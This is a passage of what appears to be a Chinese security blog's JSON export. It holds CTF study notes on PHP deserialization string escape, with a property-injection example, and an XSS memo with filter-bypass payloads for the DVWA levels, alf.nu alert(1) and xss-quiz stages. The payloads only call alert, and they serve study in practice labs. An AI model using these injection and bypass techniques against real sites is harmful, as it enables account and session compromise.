programming)链</h2><p>这道题的攻击链比较简单。当我们传入序列化完成的字符串后，程序先对其反序列化生成一个对象，这时没有_wakeup()，_destruct()魔法函数，只是简单的反序列化，之后调用readfile()函数进行$file的内容的读取，而我们将$file的值设置为了pctf.php，于是我们得到了该文件的内容。<br>反序列化漏洞需要两个条件：</p>\n<blockquote>\n<p>1.存在序列化字符串的可控制点或者说是输入点</p>\n<p>2.存在可以利用的魔法函数</p>\n</blockquote>\n<h2 id=\"反序列化字符串逃逸\"><a href=\"#反序列化字符串逃逸\" class=\"headerlink\" title=\"反序列化字符串逃逸\"></a>反序列化字符串逃逸</h2><p>当我们在序列化过程中遇到过滤函数，这种过滤可能是</p>\n<ul>\n<li>过滤后长度增加</li>\n<li>过滤后长度减少</li>\n</ul>\n<p>当要反序列化的字符串长度发生变化时，就可能会出现字符串逃逸的问题。</p>\n<p>比如我现在有如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$username = <span class=\"string\">'luc1fer3'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ser = <span class=\"keyword\">array</span>($username,$pwd);</span><br><span class=\"line\">var_dump(serialize($ser)).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$b = replace(serialize($ser));</span><br><span class=\"line\">var_dump($b).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>执行结果：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(<span class=\"number\">41</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer3<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span></span><br><span class=\"line\">string(<span class=\"number\">42</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer22<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span> <span class=\"comment\">//属性长度仍然是 8</span></span><br></pre></td></tr></table></figure>\n\n<p>这是长度增加的情况。现在考虑一种情况：我们要求更改密码为 <code>admin888</code> ，该怎么做？</p>\n<p>首先我们知道如果字符串的长度与序列化后的属性长度不同，反序列化是会报错的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:4:\"admin\";&#125;'</span>; <span class=\"comment\">//修改长度为4</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\">PHP Notice:  unserialize(): Error at offset <span class=\"number\">37</span> of <span class=\"number\">41</span> bytes</span><br><span class=\"line\">    bool(<span class=\"keyword\">false</span>)</span><br></pre></td></tr></table></figure>\n\n<p>并且，php 在反序列化时会把一些字符当作分隔符 <code>}</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:5:\"admin\";&#125;;i:2;s:2:\"ab\";&#125;'</span>; <span class=\"comment\">//识别到第一个 &#125; 之后就认为目标字符串结束，后面的会忽略掉。</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">8</span>) <span class=\"string\">\"luc1fer3\"</span></span><br><span class=\"line\">  [<span class=\"number\">1</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">5</span>) <span class=\"string\">\"admin\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>于是我们可以想到，如果我们自己构造一个特殊的字符串，手动闭合 <code>}</code> , 那我们就可以强行在反序列化之后塞入一个我们自己的属性。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$new_pwd = <span class=\"string\">'\";i:1;s:8:\"admin888\";&#125;'</span>; <span class=\"comment\">//length = 22 第一个双引号用来闭合 username</span></span><br></pre></td></tr></table></figure>\n\n<p>考虑到前面的过滤函数，我们的计划是设法使过滤后的长度增加（因为系列化后的字符串长度增加了，但是属性的长度并不变），让反系列化时系统读取的是过滤后增加的数据，然后把构造的数据变成新的属性：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;\";i:1;s:5:\"admin\";&#125;'</span> </span><br><span class=\"line\">    <span class=\"comment\">//注意这里我们根据构造的字符串长度增加了21个3，可以看到</span></span><br><span class=\"line\">    luc1fer3333333333333333333333<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125; </span></span><br><span class=\"line\"><span class=\"string\">    的长度是 8+21+22=73</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">' </span></span><br><span class=\"line\"><span class=\"string\">\t//过滤后51没变，但是</span></span><br><span class=\"line\"><span class=\"string\">luc1fer22222222222222222222222222222222222222222222\";i:1;s:8:\"admin888\";&#125;实际长度却变成了 8+21+22+22</span></span><br></pre></td></tr></table></figure>\n\n<p>每出现一个 3 就替换成 22 ,长度加 1 。 我们构造的字符串长度是 22 ，我们就需要使用 22 个(本来带的有一个，所以添加21个就可以) 3 来使长度增加22。</p>\n<p>从上面的例子可以看出，过滤后的属性长度51，在反系列化的时候刚好把替换后的数据读完，我们构造的数据闭合了双引号就逃逸出来变成新属性了。后面原来的属性会被忽略。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = <span class=\"string\">'luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = replace(serialize($ser));</span><br><span class=\"line\">var_dump($a).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">var_dump(unserialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\">string(<span class=\"number\">107</span>) <span class=\"string\">\"a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">array(2) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  [0]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(51) \"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  [1]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(8) \"</span>admin888<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n","text":"序列化与反序列化0x01为什么要序列化php允许保存一个对象方便以后重用，这个过程称为序列化。在传递变量的过程中有可能遇到变量值跨脚本传输的过程。比如文件结构是这样的： [Figure] ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"XSS 学习","slug":"xss备忘","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:51.496Z","comments":true,"path":"api/articles/xss备忘.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"xss备忘\"><a href=\"#xss备忘\" class=\"headerlink\" title=\"xss备忘\"></a>xss备忘</h1><p>11/1/2019 10:50:21 AM </p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"reflected\"><a href=\"#reflected\" class=\"headerlink\" title=\"reflected\"></a>reflected</h3><p><strong>low</strong></p>\n<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {\n    // Get input\n    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );\n\n    // Feedback for end user\n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;\n}\n\n?&gt; </code></pre><p>黑名单过滤，采用正则不区分大小写，双写、大小写混淆不行了，但是我们可以使用其他的事件标签：</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); \n    // Feedback for end user \n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h2 id=\"Stored\"><a href=\"#Stored\" class=\"headerlink\" title=\"Stored\"></a>Stored</h2><p><strong>low</strong></p>\n<p>name 处长度限制， Message 处尝试 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>\n<p><strong>medium</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> 移除字符串中的 HTML、XML 以及 PHP 标签，但允许使用 <code>&lt;b&gt;</code> 标签。  <code>addslashes</code>  返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串； <code>htmlspecialchars</code> 对参数进行实体编码，无法再对 <code>message</code> 进行 XSS ，但是 <code>name</code> 处可以通过修改长度进行 xss。</p>\n<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>似曾相识呢😋</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \nif( isset( $_POST[ &apos;btnSign&apos; ] ) ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); \n    $name    = trim( $_POST[ &apos;txtName&apos; ] ); \n    // Sanitize message input \n    $message = stripslashes( $message ); \n    $message = mysql_real_escape_string( $message ); \n    $message = htmlspecialchars( $message ); \n    // Sanitize name input \n    $name = stripslashes( $name ); \n    $name = mysql_real_escape_string( $name ); \n    $name = htmlspecialchars( $name ); \n    // Update database \n    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); \n    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); \n    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); \n    $data-&gt;execute(); \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><strong>low</strong>    </p>\n<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n    $default = $_GET[&apos;default&apos;];\n\n    # Do not allow script tags\n    if (stripos ($default, &quot;&lt;script&quot;) !== false) {\n        header (&quot;location: ?default=English&quot;);\n        exit;\n    }\n} </code></pre><p>过滤了 <code>&lt;script</code> ,观察页面源码，手动闭合事件标签 <code>&lt;/option&gt;</code> 、 <code>&lt;/select&gt;</code>，由于代码只检测 <code>$default</code> ,于是我们后面的代码可以逃逸。</p>\n<p>payload:</p>\n<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n\n    # White list the allowable languages\n    switch ($_GET[&apos;default&apos;]) {\n        case &quot;French&quot;:\n        case &quot;English&quot;:\n        case &quot;German&quot;:\n        case &quot;Spanish&quot;:\n            # ok\n            break;\n        default:\n            header (&quot;location: ?default=English&quot;);\n            exit;\n    }\n}</code></pre><p>URL 中所有在 # 之后的都会被分割，不会发送到服务端，因此不会被过滤，恶意代码会在创建页面时被用来渲染<br>读取页面内容。</p>\n<p>payload:</p>\n<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>浏览器如何渲染一个页面，找到一篇国外的文章：<a href=\"https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969\" target=\"_blank\" rel=\"noopener\">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>\n<p>HTML事件属性：<a href=\"https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>\n<h1 id=\"下面是另一个-xss-靶场\"><a href=\"#下面是另一个-xss-靶场\" class=\"headerlink\" title=\"下面是另一个 xss 靶场\"></a>下面是另一个 xss 靶场</h1><p>靶场地址：<a href=\"https://alf.nu/alert1\" target=\"_blank\" rel=\"noopener\">https://alf.nu/alert1</a></p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的值没有过滤直接拼接到字符串中，闭合前面的标签即可</p>\n<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;\n1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id=\"Adobe\"><a href=\"#Adobe\" class=\"headerlink\" title=\"Adobe\"></a>Adobe</h2><pre><code>function escape(s) {\n  s = s.replace(/&quot;/g, &apos;\\\\&quot;&apos;);\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的 <code>&quot;</code> 加了一个转义，但是我们可以闭合 <code>&lt;script&gt;</code> 标签，或者用 <code>\\</code> 再次转义</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;\n\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\n\n\\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><pre><code>function escape(s) {\n  s = JSON.stringify(s);\n  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;\n}</code></pre><p>与第二题一样</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h3><pre><code>function escape(s) {\n  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);\n  // URLs\n  text = text.replace(/(http:\\/\\/\\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);\n  // [[img123|Description]]\n  text = text.replace(/\\[\\[(\\w+)\\|(.+?)\\]\\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);\n  return text;\n}</code></pre><p>第一行过滤将所有 <code>&lt; &quot;</code> 进行实体编码</p>\n<p>第二行将所有 <code>http://S+</code> 替换为 <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,这里 S+ 为匹配一个非空白字符一次或多次。</p>\n<p>第三行将 <code>[[a|b]]</code> 替换为 <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>\n<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>\n<p>输出：</p>\n<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>通过 <code>http://onerror=alert(1)//</code> 引入 <code>alt=&quot;***&quot;</code> ,此时引号内的内容触发第二行的检测 替换为<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> 此时 <code>href</code> 带来的 <code>&quot;</code> 将 <code>alt</code> 的引号闭合，同时 <code>//</code> 将后面的代码注释掉，造成 <code>http://onerror=alert(1)</code> 逃逸出来。</p>\n<h3 id=\"DOM-1\"><a href=\"#DOM-1\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><pre><code>function escape(s) {\n  // Slightly too lazy to make two input fields.\n  // Pass in something like &quot;TextNode#foo&quot;\n  var m = s.split(/#/);\n\n  // Only slightly contrived at this point.\n  var a = document.createElement(&apos;div&apos;);\n  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));\n  return a.innerHTML;\n}</code></pre><p>通过 <code>split</code> 对传入的 s 进行分割<br>    var s=”creat#foo”; var m=s.split(/#/); m<br>    Array [ “creat”, “foo” ]</p>\n<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>相当于调用了 document.creatXXX() ,这里有几个常用的创建 DOM 节点方法</p>\n<pre><code>createElement() 创建一个元素节点\ncreateTextNode() 创建一个文本节点\ncreateAttribute() 创建一个属性节点\ncreateComment() 创建一个注释节点</code></pre><p>测试最后一个：</p>\n<pre><code>document.createComment(11111);\n&lt;!-- 11111 --&gt;</code></pre><p>Payload: 闭合注释</p>\n<pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id=\"Skandia\"><a href=\"#Skandia\" class=\"headerlink\" title=\"Skandia\"></a>Skandia</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的 s 全部变成大写，直接输入 <code>alert</code> 变成 <code>ALERT</code> 之后无法执行。</p>\n<p>利用 HTML 编码绕过</p>\n<pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>关于浏览器如何处理编码，贴一篇大佬博客：<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/292.html</a></p>\n<h2 id=\"Callback\"><a href=\"#Callback\" class=\"headerlink\" title=\"Callback\"></a>Callback</h2><h1 id=\"http-xss-quiz-int21h-jp\"><a href=\"#http-xss-quiz-int21h-jp\" class=\"headerlink\" title=\"http://xss-quiz.int21h.jp\"></a><a href=\"http://xss-quiz.int21h.jp\" target=\"_blank\" rel=\"noopener\">http://xss-quiz.int21h.jp</a></h1><h2 id=\"Stage-3\"><a href=\"#Stage-3\" class=\"headerlink\" title=\"Stage 3\"></a>Stage 3</h2><p>先尝试 <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p>\n<p>查看源码发现被转义成</p>\n<pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>看起来无法成功了，但是旁边还有个下拉栏，我们抓包试试修改第二个参数：</p>\n<pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! 这一关只是防御了第一个栏位，以后要多留心类似的。</p>\n<h2 id=\"Stage-4\"><a href=\"#Stage-4\" class=\"headerlink\" title=\"Stage 4\"></a>Stage 4</h2><p>看起来和第三关一样，仍然是先测试，发现被转义，抓包发现多了一个参数 p3 ，首先对新参数进行测试，修改成 <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> 发包发现还是失败，查看源码之后与第二关一样闭合 <code>&quot;&gt;</code> 即可。</p>\n<h2 id=\"Stage-5\"><a href=\"#Stage-5\" class=\"headerlink\" title=\"Stage 5\"></a>Stage 5</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p>\n<p>发现只显示了一段，<code>F12</code> ，修改长度再测</p>\n<p>没有过滤。</p>\n<p>好了，修改长度，直接插入吧！ </p>\n<p>试完没成功，再看看源码，原来是没闭合 <code>value</code> ，手动闭合提交：</p>\n<p>stage5 的作用只是想告诉我们 <strong>客户端的防护是无效的</strong></p>\n<h2 id=\"Stage-6\"><a href=\"#Stage-6\" class=\"headerlink\" title=\"Stage 6\"></a>Stage 6</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>被转义，而且没有其他的我们可以控制的栏位，这怎么搞？</p>\n<p>答案是用 html 语法，XSS不是只能插入 JS ，还可以使用 HTML 语法，不用 <code>&lt;&gt;/</code> 利用事件触发</p>\n<pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id=\"Stage-7\"><a href=\"#Stage-7\" class=\"headerlink\" title=\"Stage 7\"></a>Stage 7</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,这次连 <code>&quot;</code> 都转移了</p>\n<p>还是使用 html 语法，使用空格分割属性，加入一个 <code>&quot;</code> 来结束前面的语句</p>\n<h2 id=\"Stage-8\"><a href=\"#Stage-8\" class=\"headerlink\" title=\"Stage 8\"></a>Stage 8</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , 这次是将输入插入到超链接里，我们直接插入</p>\n<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>行不通，因为我们点链接发现是 <code>404</code> ，换成 <code>JavaScript</code> 试试</p>\n<pre><code>javascript:alert(document.domain);</code></pre><p>插入后点击链接：</p>\n<h2 id=\"Stage-9\"><a href=\"#Stage-9\" class=\"headerlink\" title=\"Stage 9\"></a>Stage 9</h2><p>不支持 UTF-7 编码，所以跳过</p>\n<h2 id=\"Stage-10\"><a href=\"#Stage-10\" class=\"headerlink\" title=\"Stage 10\"></a>Stage 10</h2><h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><blockquote>\n<p><a href=\"https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html\" target=\"_blank\" rel=\"noopener\">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p>\n</blockquote>\n","text":"xss备忘11/1/2019 10:50:21 AM 